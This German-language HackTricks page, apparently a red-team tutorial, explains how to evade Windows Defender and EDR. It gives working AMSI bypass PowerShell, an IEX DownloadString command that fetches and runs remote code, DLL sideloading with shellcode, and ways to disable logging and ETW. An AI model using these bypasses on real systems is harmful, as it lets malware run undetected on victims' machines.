# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Diese Seite wurde geschrieben von** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Ein Tool, um Windows Defender zu stoppen.
- [no-defender](https://github.com/es3n1n/no-defender): Ein Tool, um Windows Defender zu stoppen, indem ein anderer AV vorgetäuscht wird.
- [Deaktiviere Defender, wenn du Admin bist](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Derzeit verwenden AVs verschiedene Methoden, um zu überprüfen, ob eine Datei bösartig ist oder nicht: statische Erkennung, dynamische Analyse und für die fortschrittlicheren EDRs, Verhaltensanalyse.

### **Statische Erkennung**

Die statische Erkennung erfolgt durch das Markieren bekannter bösartiger Zeichenfolgen oder Byte-Arrays in einer Binärdatei oder einem Skript und auch durch das Extrahieren von Informationen aus der Datei selbst (z. B. Dateibeschreibung, Firmenname, digitale Signaturen, Icon, Prüfziffer usw.). Das bedeutet, dass die Verwendung bekannter öffentlicher Tools dich leichter auffliegen lassen kann, da sie wahrscheinlich analysiert und als bösartig markiert wurden. Es gibt ein paar Möglichkeiten, diese Art der Erkennung zu umgehen:

- **Verschlüsselung**

Wenn du die Binärdatei verschlüsselst, gibt es keine Möglichkeit für AV, dein Programm zu erkennen, aber du benötigst eine Art Loader, um das Programm im Speicher zu entschlüsseln und auszuführen.

- **Obfuskation**

Manchmal musst du nur einige Zeichenfolgen in deiner Binärdatei oder deinem Skript ändern, um an AV vorbeizukommen, aber das kann je nach dem, was du obfuskieren möchtest, eine zeitaufwändige Aufgabe sein.

- **Eigene Tools**

Wenn du deine eigenen Tools entwickelst, gibt es keine bekannten schlechten Signaturen, aber das erfordert viel Zeit und Mühe.

> [!TIP]
> Eine gute Möglichkeit, die statische Erkennung von Windows Defender zu überprüfen, ist [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Es teilt die Datei in mehrere Segmente auf und fordert Defender auf, jedes einzeln zu scannen, so kann es dir genau sagen, welche Zeichenfolgen oder Bytes in deiner Binärdatei markiert sind.

Ich empfehle dir dringend, diese [YouTube-Playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) über praktische AV-Evasion anzusehen.

### **Dynamische Analyse**

Die dynamische Analyse erfolgt, wenn das AV deine Binärdatei in einer Sandbox ausführt und nach bösartiger Aktivität sucht (z. B. versucht, die Passwörter deines Browsers zu entschlüsseln und zu lesen, einen Minidump von LSASS durchzuführen usw.). Dieser Teil kann etwas kniffliger sein, aber hier sind einige Dinge, die du tun kannst, um Sandboxes zu umgehen.

- **Schlaf vor der Ausführung** Je nach Implementierung kann dies eine großartige Möglichkeit sein, die dynamische Analyse von AV zu umgehen. AVs haben sehr wenig Zeit, um Dateien zu scannen, um den Arbeitsablauf des Benutzers nicht zu unterbrechen, daher können lange Schlafzeiten die Analyse von Binärdateien stören. Das Problem ist, dass viele AV-Sandboxes den Schlaf je nach Implementierung einfach überspringen können.
- **Überprüfung der Ressourcen des Systems** Normalerweise haben Sandboxes sehr wenig Ressourcen zur Verfügung (z. B. < 2 GB RAM), da sie sonst die Maschine des Benutzers verlangsamen könnten. Hier kannst du auch sehr kreativ werden, zum Beispiel indem du die CPU-Temperatur oder sogar die Lüftergeschwindigkeiten überprüfst, nicht alles wird in der Sandbox implementiert.
- **Maschinenspezifische Überprüfungen** Wenn du einen Benutzer ansprechen möchtest, dessen Arbeitsstation mit der Domäne "contoso.local" verbunden ist, kannst du eine Überprüfung der Domäne des Computers durchführen, um zu sehen, ob sie mit der von dir angegebenen übereinstimmt. Wenn nicht, kannst du dein Programm beenden.

Es stellt sich heraus, dass der Computername der Sandbox von Microsoft Defender HAL9TH ist, also kannst du den Computernamen in deiner Malware vor der Detonation überprüfen. Wenn der Name mit HAL9TH übereinstimmt, bedeutet das, dass du dich in der Sandbox von Defender befindest, also kannst du dein Programm beenden.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>Quelle: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Einige andere wirklich gute Tipps von [@mgeeky](https://twitter.com/mariuszbit) für den Umgang mit Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev Kanal</p></figcaption></figure>

Wie wir bereits in diesem Beitrag gesagt haben, **öffentliche Tools** werden letztendlich **erkannt**, also solltest du dir etwas fragen:

Wenn du zum Beispiel LSASS dumpen möchtest, **musst du wirklich mimikatz verwenden**? Oder könntest du ein anderes, weniger bekanntes Projekt verwenden, das ebenfalls LSASS dumpen kann.

Die richtige Antwort ist wahrscheinlich Letzteres. Wenn man mimikatz als Beispiel nimmt, ist es wahrscheinlich eines der, wenn nicht das am häufigsten markierte Stück Malware von AVs und EDRs. Während das Projekt selbst super cool ist, ist es auch ein Albtraum, damit zu arbeiten, um an AVs vorbeizukommen, also suche einfach nach Alternativen für das, was du erreichen möchtest.

> [!TIP]
> Wenn du deine Payloads zur Evasion modifizierst, stelle sicher, dass du **die automatische Probenübermittlung** in Defender **deaktivierst**, und bitte, ernsthaft, **LADEN SIE NICHT AUF VIRUSTOTAL HOCH**, wenn dein Ziel darin besteht, langfristig Evasion zu erreichen. Wenn du überprüfen möchtest, ob deine Payload von einem bestimmten AV erkannt wird, installiere es auf einer VM, versuche, die automatische Probenübermittlung zu deaktivieren, und teste es dort, bis du mit dem Ergebnis zufrieden bist.

## EXEs vs DLLs

Wann immer es möglich ist, **priorisiere die Verwendung von DLLs zur Evasion**, meiner Erfahrung nach werden DLL-Dateien in der Regel **deutlich weniger erkannt** und analysiert, daher ist es ein sehr einfacher Trick, um in einigen Fällen der Erkennung zu entgehen (wenn deine Payload natürlich eine Möglichkeit hat, als DLL ausgeführt zu werden).

Wie wir in diesem Bild sehen können, hat eine DLL-Payload von Havoc eine Erkennungsrate von 4/26 in antiscan.me, während die EXE-Payload eine Erkennungsrate von 7/26 hat.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me Vergleich einer normalen Havoc EXE-Payload vs einer normalen Havoc DLL</p></figcaption></figure>

Jetzt zeigen wir einige Tricks, die du mit DLL-Dateien verwenden kannst, um viel stealthier zu sein.

## DLL Sideloading & Proxying

**DLL Sideloading** nutzt die von dem Loader verwendete DLL-Suchreihenfolge aus, indem sowohl die Zielanwendung als auch die bösartigen Payload(s) nebeneinander positioniert werden.

Du kannst nach Programmen suchen, die anfällig für DLL Sideloading sind, indem du [Siofra](https://github.com/Cybereason/siofra) und das folgende PowerShell-Skript verwendest:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Dieser Befehl gibt die Liste der Programme aus, die anfällig für DLL-Hijacking in "C:\Program Files\\" sind, sowie die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle Ihnen dringend, **DLL-hijackbare/sideloadbare Programme selbst zu erkunden**. Diese Technik ist ziemlich stealthy, wenn sie richtig durchgeführt wird, aber wenn Sie öffentlich bekannte DLL-sideloadbare Programme verwenden, könnten Sie leicht erwischt werden.

Allein durch das Platzieren einer bösartigen DLL mit dem Namen, den ein Programm erwartet zu laden, wird Ihre Nutzlast nicht geladen, da das Programm einige spezifische Funktionen innerhalb dieser DLL erwartet. Um dieses Problem zu beheben, verwenden wir eine andere Technik namens **DLL Proxying/Forwarding**.

**DLL Proxying** leitet die Aufrufe, die ein Programm von der Proxy- (und bösartigen) DLL an die ursprüngliche DLL macht, weiter, wodurch die Funktionalität des Programms erhalten bleibt und die Ausführung Ihrer Nutzlast gehandhabt werden kann.

Ich werde das [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) Projekt von [@flangvik](https://twitter.com/Flangvik/) verwenden.

Dies sind die Schritte, die ich befolgt habe:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Der letzte Befehl gibt uns 2 Dateien: eine DLL-Quellcodevorlage und die original umbenannte DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unser Shellcode (kodiert mit [SGN](https://github.com/EgeBalci/sgn)) als auch die Proxy-DLL haben eine Erkennungsrate von 0/26 in [antiscan.me](https://antiscan.me)! Ich würde das als Erfolg bezeichnen.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ich **empfehle dringend**, dass Sie [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) über DLL Sideloading ansehen und auch [ippsec's Video](https://www.youtube.com/watch?v=3eROsG_WNpE), um mehr über das, was wir ausführlicher besprochen haben, zu erfahren.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ist ein Payload-Toolkit zum Umgehen von EDRs unter Verwendung von angehaltenen Prozessen, direkten Syscalls und alternativen Ausführungsmethoden`

Sie können Freeze verwenden, um Ihren Shellcode auf eine stealthy Weise zu laden und auszuführen.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ist nur ein Katz-und-Maus-Spiel, was heute funktioniert, könnte morgen erkannt werden, also verlasse dich niemals nur auf ein Werkzeug, wenn möglich, versuche mehrere Umgehungstechniken zu kombinieren.

## AMSI (Anti-Malware Scan Interface)

AMSI wurde geschaffen, um "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" zu verhindern. Zunächst waren AVs nur in der Lage, **Dateien auf der Festplatte** zu scannen, also wenn du es irgendwie schaffen konntest, Payloads **direkt im Speicher** auszuführen, konnte der AV nichts tun, um dies zu verhindern, da er nicht genügend Sichtbarkeit hatte.

Die AMSI-Funktion ist in diese Komponenten von Windows integriert.

- Benutzerkontensteuerung oder UAC (Erhöhung von EXE, COM, MSI oder ActiveX-Installation)
- PowerShell (Skripte, interaktive Nutzung und dynamische Codeauswertung)
- Windows Script Host (wscript.exe und cscript.exe)
- JavaScript und VBScript
- Office VBA-Makros

Es ermöglicht Antivirenlösungen, das Verhalten von Skripten zu inspizieren, indem der Skriptinhalt in einer Form offengelegt wird, die sowohl unverschlüsselt als auch nicht obfuskiert ist.

Die Ausführung von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` wird den folgenden Alarm auf Windows Defender erzeugen.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Beachte, wie es `amsi:` voranstellt und dann den Pfad zur ausführbaren Datei, von der das Skript ausgeführt wurde, in diesem Fall powershell.exe.

Wir haben keine Datei auf die Festplatte geschrieben, wurden aber trotzdem im Speicher aufgrund von AMSI erwischt.

Darüber hinaus wird ab **.NET 4.8** auch C#-Code durch AMSI ausgeführt. Dies betrifft sogar `Assembly.Load(byte[])` für die Ausführung im Speicher. Deshalb wird empfohlen, niedrigere Versionen von .NET (wie 4.7.2 oder darunter) für die Ausführung im Speicher zu verwenden, wenn du AMSI umgehen möchtest.

Es gibt ein paar Möglichkeiten, um AMSI zu umgehen:

- **Obfuskation**

Da AMSI hauptsächlich mit statischen Erkennungen arbeitet, kann das Modifizieren der Skripte, die du zu laden versuchst, eine gute Möglichkeit sein, um Erkennung zu umgehen.

Allerdings hat AMSI die Fähigkeit, Skripte zu deobfuskieren, selbst wenn sie mehrere Schichten haben, sodass Obfuskation je nach Ausführung eine schlechte Option sein könnte. Das macht es nicht so einfach, zu entkommen. Manchmal musst du jedoch nur ein paar Variablennamen ändern, und es wird funktionieren, also hängt es davon ab, wie stark etwas markiert wurde.

- **AMSI Bypass**

Da AMSI implementiert ist, indem eine DLL in den PowerShell (auch cscript.exe, wscript.exe usw.) Prozess geladen wird, ist es möglich, damit einfach zu manipulieren, selbst wenn man als unprivilegierter Benutzer läuft. Aufgrund dieses Fehlers in der Implementierung von AMSI haben Forscher mehrere Möglichkeiten gefunden, um das AMSI-Scanning zu umgehen.

**Einen Fehler erzwingen**

Das Erzwingen des AMSI-Initialisierungsfehlers (amsiInitFailed) führt dazu, dass kein Scan für den aktuellen Prozess initiiert wird. Ursprünglich wurde dies von [Matt Graeber](https://twitter.com/mattifestation) offengelegt, und Microsoft hat eine Signatur entwickelt, um eine breitere Nutzung zu verhindern.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Alles, was nötig war, war eine Zeile PowerShell-Code, um AMSI für den aktuellen PowerShell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst markiert, daher sind einige Änderungen erforderlich, um diese Technik zu verwenden.

Hier ist ein modifizierter AMSI-Bypass, den ich aus diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) entnommen habe.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Beachte, dass dies wahrscheinlich markiert wird, sobald dieser Beitrag veröffentlicht wird, also solltest du keinen Code veröffentlichen, wenn dein Plan darin besteht, unentdeckt zu bleiben.

**Memory Patching**

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/_RastaMouse/) entdeckt und beinhaltet das Finden der Adresse der Funktion "AmsiScanBuffer" in amsi.dll (verantwortlich für das Scannen der vom Benutzer bereitgestellten Eingaben) und das Überschreiben mit Anweisungen, um den Code für E_INVALIDARG zurückzugeben. Auf diese Weise wird das Ergebnis des tatsächlichen Scans 0 zurückgeben, was als sauberes Ergebnis interpretiert wird.

> [!TIP]
> Bitte lies [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) für eine detailliertere Erklärung.

Es gibt auch viele andere Techniken, die verwendet werden, um AMSI mit PowerShell zu umgehen. Schau dir [**diese Seite**](basic-powershell-for-pentesters/index.html#amsi-bypass) und [**dieses Repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) an, um mehr darüber zu erfahren.

Dieses Tool [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) generiert ebenfalls Skripte, um AMSI zu umgehen.

**Entferne die erkannte Signatur**

Du kannst ein Tool wie **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** und **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** verwenden, um die erkannte AMSI-Signatur aus dem Speicher des aktuellen Prozesses zu entfernen. Dieses Tool funktioniert, indem es den Speicher des aktuellen Prozesses nach der AMSI-Signatur durchsucht und sie dann mit NOP-Anweisungen überschreibt, wodurch sie effektiv aus dem Speicher entfernt wird.

**AV/EDR-Produkte, die AMSI verwenden**

Du kannst eine Liste von AV/EDR-Produkten, die AMSI verwenden, in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** finden.

**Verwende PowerShell Version 2**
Wenn du PowerShell Version 2 verwendest, wird AMSI nicht geladen, sodass du deine Skripte ausführen kannst, ohne von AMSI gescannt zu werden. Du kannst dies tun:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell-Logging ist eine Funktion, die es Ihnen ermöglicht, alle PowerShell-Befehle, die auf einem System ausgeführt werden, zu protokollieren. Dies kann nützlich für Prüfungs- und Fehlersuchezwecke sein, kann aber auch ein **Problem für Angreifer darstellen, die eine Erkennung umgehen möchten**.

Um das PowerShell-Logging zu umgehen, können Sie die folgenden Techniken verwenden:

- **Deaktivieren der PowerShell-Transkription und des Modul-Loggings**: Sie können ein Tool wie [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) zu diesem Zweck verwenden.
- **Verwenden Sie PowerShell Version 2**: Wenn Sie PowerShell Version 2 verwenden, wird AMSI nicht geladen, sodass Sie Ihre Skripte ausführen können, ohne von AMSI gescannt zu werden. Sie können dies tun: `powershell.exe -version 2`
- **Verwenden Sie eine nicht verwaltete PowerShell-Sitzung**: Verwenden Sie [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), um eine PowerShell ohne Abwehrmaßnahmen zu starten (das ist das, was `powerpick` von Cobalt Strike verwendet).

## Obfuscation

> [!TIP]
> Mehrere Obfuskationstechniken basieren auf der Verschlüsselung von Daten, was die Entropie der Binärdatei erhöht und es AVs und EDRs erleichtert, sie zu erkennen. Seien Sie vorsichtig damit und wenden Sie möglicherweise die Verschlüsselung nur auf bestimmte Abschnitte Ihres Codes an, die sensibel sind oder verborgen werden müssen.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Bei der Analyse von Malware, die ConfuserEx 2 (oder kommerzielle Forks) verwendet, ist es üblich, mehreren Schutzschichten gegenüberzustehen, die Decompiler und Sandboxes blockieren. Der folgende Workflow stellt zuverlässig **ein nahezu originales IL** wieder her, das anschließend in Tools wie dnSpy oder ILSpy in C# dekompiliert werden kann.

1.  Anti-Tampering-Entfernung – ConfuserEx verschlüsselt jeden *Methodenkörper* und entschlüsselt ihn im *Modul*-statischen Konstruktor (`<Module>.cctor`). Dies patcht auch die PE-Prüfziffer, sodass jede Modifikation die Binärdatei zum Absturz bringt. Verwenden Sie **AntiTamperKiller**, um die verschlüsselten Metadaten-Tabellen zu lokalisieren, die XOR-Schlüssel wiederherzustellen und eine saubere Assembly neu zu schreiben:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Die Ausgabe enthält die 6 Anti-Tamper-Parameter (`key0-key3`, `nameHash`, `internKey`), die nützlich sein können, wenn Sie Ihren eigenen Unpacker erstellen.

2.  Symbol- / Kontrollfluss-Wiederherstellung – füttern Sie die *saubere* Datei an **de4dot-cex** (einen ConfuserEx-bewussten Fork von de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – wählt das ConfuserEx 2-Profil aus
• de4dot wird die Kontrollfluss-Glättung rückgängig machen, die ursprünglichen Namensräume, Klassen und Variablennamen wiederherstellen und konstante Zeichenfolgen entschlüsseln.

3.  Proxy-Call-Entfernung – ConfuserEx ersetzt direkte Methodenaufrufe durch leichte Wrapper (auch bekannt als *Proxy-Calls*), um die Dekompilierung weiter zu erschweren. Entfernen Sie sie mit **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nach diesem Schritt sollten Sie normale .NET-APIs wie `Convert.FromBase64String` oder `AES.Create()` anstelle von undurchsichtigen Wrapper-Funktionen (`Class8.smethod_10`, …) beobachten.

4.  Manuelle Bereinigung – führen Sie die resultierende Binärdatei unter dnSpy aus, suchen Sie nach großen Base64-Blobs oder `RijndaelManaged`/`TripleDESCryptoServiceProvider`, um die *echte* Nutzlast zu lokalisieren. Oft speichert die Malware sie als TLV-kodiertes Byte-Array, das innerhalb von `<Module>.byte_0` initialisiert wird.

Die obige Kette stellt den Ausführungsfluss **ohne** die Ausführung der bösartigen Probe wieder her – nützlich, wenn Sie an einem Offline-Arbeitsplatz arbeiten.

> 🛈  ConfuserEx erzeugt ein benutzerdefiniertes Attribut namens `ConfusedByAttribute`, das als IOC verwendet werden kann, um Proben automatisch zu triagieren.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# Obfuskator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ziel dieses Projekts ist es, einen Open-Source-Fork der [LLVM](http://www.llvm.org/) Kompilierungs-Suite bereitzustellen, der eine erhöhte Software-Sicherheit durch [Code-Obfuskation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) und Manipulationssicherheit bietet.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstriert, wie man die Sprache `C++11/14` verwendet, um zur Compile-Zeit obfuskierten Code zu generieren, ohne externe Tools zu verwenden und ohne den Compiler zu modifizieren.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Schicht obfuskierten Operationen hinzu, die durch das C++-Template-Metaprogrammierungs-Framework generiert werden, was das Leben der Person, die die Anwendung knacken möchte, ein wenig schwieriger macht.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64-Binär-Obfuskator, der in der Lage ist, verschiedene PE-Dateien zu obfuskieren, einschließlich: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache metamorphe Code-Engine für beliebige ausführbare Dateien.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein feinkörniges Code-Obfuskations-Framework für LLVM-unterstützte Sprachen, das ROP (return-oriented programming) verwendet. ROPfuscator obfuskiert ein Programm auf der Ebene des Assemblercodes, indem es reguläre Anweisungen in ROP-Ketten umwandelt und damit unser natürliches Verständnis des normalen Kontrollflusses untergräbt.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein .NET PE Crypter, der in Nim geschrieben ist.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann vorhandene EXE/DLL in Shellcode umwandeln und diese dann laden.

## SmartScreen & MoTW

Sie haben möglicherweise diesen Bildschirm gesehen, als Sie einige ausführbare Dateien aus dem Internet heruntergeladen und ausgeführt haben.

Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der dazu dient, den Endbenutzer vor dem Ausführen potenziell schädlicher Anwendungen zu schützen.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funktioniert hauptsächlich mit einem reputationsbasierten Ansatz, was bedeutet, dass ungewöhnlich heruntergeladene Anwendungen SmartScreen auslösen und somit den Endbenutzer daran hindern, die Datei auszuführen (obwohl die Datei weiterhin durch Klicken auf Weitere Informationen -> Trotzdem ausführen ausgeführt werden kann).

**MoTW** (Mark of The Web) ist ein [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) mit dem Namen Zone.Identifier, der automatisch beim Herunterladen von Dateien aus dem Internet erstellt wird, zusammen mit der URL, von der sie heruntergeladen wurden.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Überprüfung des Zone.Identifier ADS für eine aus dem Internet heruntergeladene Datei.</p></figcaption></figure>

> [!TIP]
> Es ist wichtig zu beachten, dass ausführbare Dateien, die mit einem **vertrauenswürdigen** Signaturzertifikat signiert sind, **SmartScreen nicht auslösen**.

Eine sehr effektive Möglichkeit, um zu verhindern, dass Ihre Payloads das Mark of The Web erhalten, besteht darin, sie in eine Art Container wie eine ISO zu verpacken. Dies geschieht, weil das Mark-of-the-Web (MOTW) **nicht** auf **nicht NTFS**-Volumes angewendet werden kann.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ist ein Tool, das Payloads in Ausgabebehälter verpackt, um dem Mark-of-the-Web zu entkommen.

Beispielverwendung:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hier ist eine Demo zum Umgehen von SmartScreen, indem Payloads in ISO-Dateien verpackt werden, unter Verwendung von [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ist ein leistungsstarkes Protokollierungsmechanismus in Windows, das es Anwendungen und Systemkomponenten ermöglicht, **Ereignisse zu protokollieren**. Es kann jedoch auch von Sicherheitsprodukten verwendet werden, um böswillige Aktivitäten zu überwachen und zu erkennen.

Ähnlich wie AMSI deaktiviert (umgangen) werden kann, ist es auch möglich, die **`EtwEventWrite`**-Funktion des Benutzerspace-Prozesses so zu gestalten, dass sie sofort zurückkehrt, ohne Ereignisse zu protokollieren. Dies geschieht, indem die Funktion im Speicher so gepatcht wird, dass sie sofort zurückkehrt, wodurch die ETW-Protokollierung für diesen Prozess effektiv deaktiviert wird.

Weitere Informationen finden Sie unter **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) und [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.

## C# Assembly Reflection

Das Laden von C#-Binaries im Speicher ist schon seit einiger Zeit bekannt und ist immer noch eine sehr gute Möglichkeit, Ihre Post-Exploitation-Tools auszuführen, ohne von AV erwischt zu werden.

Da die Payload direkt in den Speicher geladen wird, ohne die Festplatte zu berühren, müssen wir uns nur um das Patchen von AMSI für den gesamten Prozess kümmern.

Die meisten C2-Frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc usw.) bieten bereits die Möglichkeit, C#-Assemblies direkt im Speicher auszuführen, aber es gibt verschiedene Möglichkeiten, dies zu tun:

- **Fork\&Run**

Es beinhaltet **das Erzeugen eines neuen opfernden Prozesses**, das Injizieren Ihres böswilligen Codes in diesen neuen Prozess, das Ausführen Ihres böswilligen Codes und das Beenden des neuen Prozesses, wenn Sie fertig sind. Dies hat sowohl Vorteile als auch Nachteile. Der Vorteil der Fork-and-Run-Methode besteht darin, dass die Ausführung **außerhalb** unseres Beacon-Implantatprozesses erfolgt. Das bedeutet, dass, wenn etwas in unserer Post-Exploitation-Aktion schiefgeht oder entdeckt wird, die **Wahrscheinlichkeit, dass unser Implantat überlebt, viel größer ist.** Der Nachteil ist, dass Sie eine **größere Chance** haben, von **verhaltensbasierten Erkennungen** erwischt zu werden.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Es geht darum, den böswilligen Code der Post-Exploitation **in seinen eigenen Prozess** zu injizieren. Auf diese Weise können Sie vermeiden, einen neuen Prozess zu erstellen und ihn von AV scannen zu lassen, aber der Nachteil ist, dass, wenn etwas mit der Ausführung Ihrer Payload schiefgeht, die **Wahrscheinlichkeit, dass Sie Ihr Beacon verlieren, viel größer ist**, da es abstürzen könnte.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Wenn Sie mehr über das Laden von C#-Assemblies lesen möchten, schauen Sie sich bitte diesen Artikel an [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und deren InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Sie können auch C#-Assemblies **aus PowerShell** laden, schauen Sie sich [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [S3cur3th1sSh1t's Video](https://www.youtube.com/watch?v=oe11Q-3Akuk) an.

## Verwendung anderer Programmiersprachen

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, ist es möglich, böswilligen Code mit anderen Sprachen auszuführen, indem man der kompromittierten Maschine Zugriff **auf die Interpreterumgebung gewährt, die auf dem vom Angreifer kontrollierten SMB-Share installiert ist**.

